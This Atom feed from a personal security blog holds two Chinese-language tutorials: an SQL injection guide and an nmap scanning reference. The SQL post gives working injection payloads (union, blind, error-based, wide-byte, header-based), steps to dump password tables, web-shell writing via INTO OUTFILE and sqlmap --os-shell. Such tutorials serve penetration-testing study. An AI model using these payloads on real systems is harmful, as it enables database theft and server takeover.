<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-16T23:04:07-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
&lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
  &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
&lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
  &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
</subtitle><entry><title type="html">sql注入</title><link href="http://localhost:4000/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/" rel="alternate" type="text/html" title="sql注入" /><published>2020-07-16T00:00:00-04:00</published><updated>2020-07-16T00:00:00-04:00</updated><id>http://localhost:4000/_posts/sql%E6%B3%A8%E5%85%A5</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;sql注入原理&quot;&gt;SQL注入原理&lt;/h1&gt;

&lt;p&gt;SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料）&lt;/p&gt;

&lt;h1 id=&quot;sql注入的位置&quot;&gt;&lt;strong&gt;SQL注入的位置&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;表单提交，主要是POST请求，也包括GET请求；&lt;/li&gt;
  &lt;li&gt;URL参数提交，主要为GET请求参数；&lt;/li&gt;
  &lt;li&gt;Cookie参数提交；&lt;/li&gt;
  &lt;li&gt;HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；&lt;/li&gt;
  &lt;li&gt;一些边缘的输入点，比如.mp3文件的一些文件信息等。&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;sql注入漏洞常见类型&quot;&gt;SQL注入漏洞常见类型&lt;/h1&gt;

&lt;h2 id=&quot;union注入攻击&quot;&gt;union注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;判断是get型还是post型注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;找到正确的闭合规则；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;order by 查询字段数；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;union select 1,2…..查看显示位是第几位，没有的话就试试把id=1的显示位让出来，让其等于id=-1；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/sqli.png&quot; alt=&quot;sqli&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;二、三位显示出来了，那么即可在这两个位置写入sql语句；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询当前数据库,当前mysql用户 union select 1,user(),database()；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询当前数据库里面的表 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”data_name”;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询到敏感表名user，继续查询表里面的字段 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”user”;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询字段，例如“id”、”passwd”的内容 union select 1,id,passwd from user;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;拿到用户、密码登入后台。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;boolean注入攻击-布尔盲注&quot;&gt;Boolean注入攻击-布尔盲注&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错；&lt;/li&gt;
  &lt;li&gt;由页面的两种不同返回的状态来判定我们的闭合规则；&lt;/li&gt;
  &lt;li&gt;为了方便，我们这里假设返回正确用“yes”，返回错误用“no”来表示这两种状态&lt;/li&gt;
  &lt;li&gt;找到闭合规则后，我们在闭合规则里面 and 1=1 和 and 1=2 测试一下，看看最后返回是不是两种状态；&lt;/li&gt;
  &lt;li&gt;布尔盲注要用到length()和substr()语句，用两种状态来猜解数据库、表名等的长度和正确字母；&lt;/li&gt;
  &lt;li&gt;先用 and length(database())&amp;gt;2 来猜数据库的长度，使用的是二分法；&lt;/li&gt;
  &lt;li&gt;再用 and substr(database(),1,1)=’t’ 来确定第一个字母，可用burp跑，26个字母,哪个字母返回yes则代表第一个字母就是它；&lt;/li&gt;
  &lt;li&gt;and substr(database(),2,1)=’t’ 代表当前数据库的第二个字母；&lt;/li&gt;
  &lt;li&gt;最后结合长度，成功的将数据库猜解出来；&lt;/li&gt;
  &lt;li&gt;后面的操作跟union注入的步骤差不多了，只是sql语句写在 上文的 database() 处。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;报错注入攻击&quot;&gt;报错注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;只要注入点有sql报错信息，那么就可以使用报错注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;updatexml报错获取当前数据库：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;and updatexml(1,concat(0x7e,(select database()),0x7e),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;floor报错获取当前数据库&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;两种方式都可行，如果第一个不行就试试第二个&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;只不过这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;时间注入攻击-时间盲注&quot;&gt;时间注入攻击-时间盲注&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;没有明确的现象，不管是对是错都返回一个状态；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;同样的找到正确的闭合规则，当然，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;时间盲注配合着 if(A,B,C) 语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;那么判断当前数据库名的长度的语句为：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;if (length(database())&amp;gt;1,sleep(5),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是不延时)，由此来推出数据库长度。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;判断当前数据库名的第一个和第二个字母的语句：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;if(substr(database(),1,1)='s',sleep(5),1)
if(substr(database(),2,1)='s',sleep(5),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;堆叠查询注入攻击&quot;&gt;堆叠查询注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;堆叠注入的语句为&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;;select if(length(database())&amp;gt;1,sleep(3),1)
;select if(substr(database(),1,1)='r',sleep(3),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;二次注入攻击&quot;&gt;二次注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;二次注入一共有两个url，url一用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；&lt;/li&gt;
  &lt;li&gt;也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；&lt;/li&gt;
  &lt;li&gt;就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；&lt;/li&gt;
  &lt;li&gt;跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；&lt;/li&gt;
  &lt;li&gt;后面就是union注入攻击的常规操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;宽字节注入攻击&quot;&gt;宽字节注入攻击&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；&lt;/li&gt;
  &lt;li&gt;一般情况下，此处就不存在sql注入漏洞的；&lt;/li&gt;
  &lt;li&gt;但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；&lt;/li&gt;
  &lt;li&gt;宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；&lt;/li&gt;
  &lt;li&gt;因此构造闭合规则时，在单引号前面加上 %df 就行了；&lt;/li&gt;
  &lt;li&gt;之后在闭合规则中写入同union注入的一些查询语句就行了；&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;base64注入攻击&quot;&gt;base64注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；&lt;/li&gt;
  &lt;li&gt;那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；&lt;/li&gt;
  &lt;li&gt;注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;http请求头参数注入-cookie注入攻击&quot;&gt;HTTP请求头参数注入-cookie注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;常见的http头部注入的参数有：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;和union注入的差别就在于注入点不一样，之后使用union注入的方法即可&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;http请求头参数注入-xff注入攻击&quot;&gt;HTTP请求头参数注入-XFF注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;例如测试此参数的值 X-Forwarded-for:127.0.0.1’ 响应有sql报错，那么此处就是注入点；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;之后使用union注入的方法完成即可&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;知道绝对路径的注入&quot;&gt;知道绝对路径的注入&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;如果通过一些方式爆出了网站的根目录，并且知道此站点存在sql注入；&lt;/li&gt;
  &lt;li&gt;猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用菜刀连接；&lt;/li&gt;
  &lt;li&gt;如果数据库没有file权限，那么我们用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；&lt;/li&gt;
  &lt;li&gt;如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；&lt;/li&gt;
  &lt;li&gt;如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;sqlmap&quot;&gt;SQLMAP&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;官网:http://sqlmap.org/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;help&quot;&gt;HELP&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;➜  ~ sqlmap -h 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST
    --cookie=COOKIE     HTTP Cookie header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to this value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default &quot;BEUSTQ&quot;)

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;检查注入点&quot;&gt;检查注入点&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;爆所有数据库信息&quot;&gt;爆所有数据库信息&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL --dbs
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;爆当前数据库信息&quot;&gt;爆当前数据库信息&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL --current-db
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名列出所有表&quot;&gt;指定库名列出所有表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 --tables
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名表名列出所有字段&quot;&gt;指定库名表名列出所有字段&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 -T 表名 --columns
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名表名字段dump出指定字段&quot;&gt;指定库名表名字段dump出指定字段&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 -T 表名 -C 字段...--dump
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">nmap</title><link href="http://localhost:4000/_posts/2020-07-12-nmap/" rel="alternate" type="text/html" title="nmap" /><published>2020-07-12T00:00:00-04:00</published><updated>2020-07-12T00:00:00-04:00</updated><id>http://localhost:4000/_posts/nmap</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-12-nmap/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;nmap是用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图Nmap的发送特制的数据包到目标主机然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;官网:&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//nmap.org/&quot;&gt;http://nmap.org&lt;/a&gt; 图形化:Zenmap&lt;/p&gt;

&lt;h1 id=&quot;基本操作&quot;&gt;基本操作&lt;/h1&gt;

&lt;h2 id=&quot;基本快速扫描&quot;&gt;基本快速扫描&lt;/h2&gt;

&lt;p&gt;Nmap 默认发送一个&lt;code&gt;arp的ping数据包&lt;/code&gt;来探测目标主机在1-10000范围内所开放的端口。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bashl&quot;&gt;nmap  ip
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;快速扫描多个目标&quot;&gt;快速扫描多个目标&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap  ip1 ip2
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;详细描述输出扫描&quot;&gt;详细描述输出扫描&lt;/h2&gt;

&lt;p&gt;简单扫描并对返回的结果详细描述输出,这个扫描是可以看到扫描的过程的,漫长的扫描的过程中可以看到百分比 就不会显得那么枯燥而且可以提升逼格。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -vv ip
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定端口和范围扫描&quot;&gt;指定端口和范围扫描&lt;/h2&gt;

&lt;p&gt;nmap 默认扫描目标1-10000范围内的端口号。我们则可以通过参数&lt;code&gt;-p&lt;/code&gt; 来设置我们将要扫描的端口号&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -p(range) &amp;lt;target IP&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;扫描除过某一个ip外的所有子网主机&quot;&gt;扫描除过某一个ip外的所有子网主机&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap 10.130.1.1/24 -exclude 10.130.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;扫描除过某一个文件中的ip外的子网主机&quot;&gt;扫描除过某一个文件中的ip外的子网主机&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap 10.130.1.1/24 -excludefile gov.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;显示扫描的所有主机的列表&quot;&gt;显示扫描的所有主机的列表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sL 10.130.1.1/24
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;sp-ping-扫描&quot;&gt;sP ping 扫描&lt;/h2&gt;

&lt;p&gt;nmap 可以利用类似window/linux 系统下的ping方式进行扫描&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sP &amp;lt;target ip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一般来说 我们会用这个命令去扫描内网的一个ip范围用来做内网的主机发现。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sP 10.130.1.1-255
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PING扫描不同于其它的扫描方式因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限如果用户没有ROOT权限,PING扫描将会使用connect()调用&lt;/p&gt;

&lt;h2 id=&quot;ss-syn半开放扫描&quot;&gt;sS SYN半开放扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sS 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描因为这种技术使得Nmap不需要通过完整的握手就能获得远程主机的信息。Nmap发送SYN包到远程主机但是它不会产生任何会话.因此&lt;code&gt;不会在目标主机上产生任何日志记录&lt;/code&gt;,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是&lt;code&gt;Tcp SYN&lt;/code&gt;.但是它需要&lt;code&gt;root/administrator&lt;/code&gt;权限。&lt;/p&gt;

&lt;h2 id=&quot;st-tcp扫描&quot;&gt;sT TCP扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sT 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口。&lt;/p&gt;

&lt;h2 id=&quot;su-udp扫描&quot;&gt;sU UDP扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sU 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机并等待响应,如果返回ICMP不可达的错误消息说明端口是关闭的如果得到正确的适当的回应说明端口是开放的.&lt;/p&gt;

&lt;h2 id=&quot;sf-fin标志的数据包扫描&quot;&gt;sF FIN标志的数据包扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sF 110.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出这个扫描的话 会漏扫许多~FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.&lt;/p&gt;

&lt;h2 id=&quot;sv-version版本检测扫描&quot;&gt;sV Version版本检测扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sV 192.168.1.135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;本检测是用来扫描目标主机和端口上&lt;code&gt;运行的软件的版本&lt;/code&gt;.它不同于其它的扫描技术它不是用来扫描目标主机上开放的端口不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口。&lt;/p&gt;

&lt;p&gt;这个扫描的话速度会慢一些&lt;code&gt;67.86&lt;/code&gt;秒扫一个IP。&lt;/p&gt;

&lt;h2 id=&quot;o-os操作系统类型的探测&quot;&gt;O OS操作系统类型的探测&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -O 10.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;远程检测操作系统和软件Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上然后检查结果和数据库对照。&lt;/p&gt;

&lt;h2 id=&quot;osscan-guess-猜测匹配操作系统&quot;&gt;osscan-guess 猜测匹配操作系统&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -O --osscan-guess 192.168.1.134
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过Nmap准确的检测到远程操作系统是比较困难的需要使用到Nmap的猜测功能选项,&lt;code&gt;–osscan-guess&lt;/code&gt;猜测认为最接近目标的匹配操作系统类型。&lt;/p&gt;

&lt;h2 id=&quot;pn-no-ping扫描&quot;&gt;PN No ping扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -O -PN 192.168.1.1/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果远程主机有防火墙IDS和IPS系统你可以使用-PN命令来确保不ping远程主机因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现。&lt;/p&gt;

&lt;p&gt;这个扫描整个c段局域网的话还是比较耗时的但是信息收集很详细大概耗时&lt;code&gt;9&lt;/code&gt;分钟。&lt;/p&gt;

&lt;h2 id=&quot;t-设置时间模板&quot;&gt;T 设置时间模板&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sS -T&amp;lt;0-5&amp;gt; 192.168.1.134
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;优化时间控制选项的功能很强大也很有效但有些用户会被迷惑。此外 往往选择合适参数的时间超过了所需优化的扫描时间。因此Nmap提供了一些简单的 方法使用6个时间模板使用时采用-T选项及数字(0 – 5) 或名称。模板名称有&lt;code&gt;paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;paranoid、sneaky模式用于IDS躲避&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Normal为默认模式因此-T3 实际上是未做任何优化。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

